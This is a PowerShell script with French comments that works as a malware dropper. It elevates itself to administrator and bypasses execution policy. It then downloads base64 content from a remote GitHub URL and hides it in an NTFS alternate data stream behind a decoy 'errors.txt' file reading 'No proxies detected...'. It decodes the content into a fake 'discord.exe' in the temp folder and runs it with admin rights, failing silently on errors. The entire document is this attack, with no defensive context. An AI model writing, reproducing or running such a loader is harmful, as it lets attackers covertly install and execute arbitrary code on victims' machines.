if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Paramètres
$WebUrl = "https://raw.githubusercontent.com/himl3333rdiscord-netizen/calc-txt/refs/heads/main/temp"
$HostFile = "./errors.txt"
$ADSName = "ads.b64"
$TempExecutable = "$env:TEMP\discord.exe"

# Étape 1: Télécharger le contenu depuis le web
try {
    $Base64Content = Invoke-WebRequest -Uri $WebUrl -UseBasicParsing | Select-Object -ExpandProperty Content
    
    if (-not $Base64Content) {
        throw "Contenu vide reçu"
    }
}
catch {
    exit 1
}

try {
    "No proxies detected..." | Out-File $HostFile -Encoding UTF8
}
catch {
    exit 1
}

# Étape 3: Stocker le contenu dans un ADS
try {
    Set-Content -Path "$HostFile`:$ADSName" -Value $Base64Content
    
    # Vérifier
    $StreamInfo = Get-Item $HostFile -Stream $ADSName -ErrorAction SilentlyContinue
    if ($StreamInfo) {
    } else {
        throw "ADS non détecté après création"
    }
}
catch {
    exit 1
}

# Étape 4: Lire depuis l'ADS et décoder
try {
    
    # Méthode 1: Get-Content (recommandé)
    $EncodedFromADS = Get-Content "$HostFile`:$ADSName"
    
    # Nettoyer les éventuels sauts de ligne
    $EncodedFromADS = $EncodedFromADS -replace "`n|`r|\s", ""
    
    # Décoder Base64
    $DecodedBytes = [System.Convert]::FromBase64String($EncodedFromADS)
}
catch {
    try {
        $Stream = [System.IO.File]::OpenRead("$HostFile`:$ADSName")
        $Reader = New-Object System.IO.StreamReader($Stream)
        $EncodedFromADS = $Reader.ReadToEnd()
        $Reader.Close()
        $Stream.Close()
        
        $DecodedBytes = [System.Convert]::FromBase64String($EncodedFromADS.Trim())
    }
    catch {
        exit 1
    }
}

# Étape 5: Sauvegarder l'exécutable
try {
    [System.IO.File]::WriteAllBytes($TempExecutable, $DecodedBytes)
    
    # Vérifier la signature/existence
    if (Test-Path $TempExecutable) {
        $FileInfo = Get-Item $TempExecutable
    } else {
        throw "Fichier non créé"
    }
}
catch {
    exit 1
}

# Étape 6: Exécuter en tant qu'administrateur
try {
    
    # Vérifier si on est déjà admin
    $CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        
        # Créer un script temporaire pour l'exécution
        $ElevatedScript = @"
Start-Process -FilePath `"$TempExecutable`" -Verb RunAs -Wait
"@
        
        $TempScript = "$env:TEMP\elevate_execution.ps1"
        $ElevatedScript | Out-File $TempScript -Encoding UTF8
        
        # Lancer avec élévation
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$TempScript`"" -Verb RunAs
    }
    else {
        Start-Process -FilePath $TempExecutable -Verb RunAs -Wait
    }
}
catch {
}

# Étape 7: Nettoyage optionnel
$Cleanup = Read-Host "Supprimer le fichier temporaire? (O/N)"
if ($Cleanup -eq "O" -or $Cleanup -eq "o") {
    Remove-Item $TempExecutable -Force -ErrorAction SilentlyContinue
}
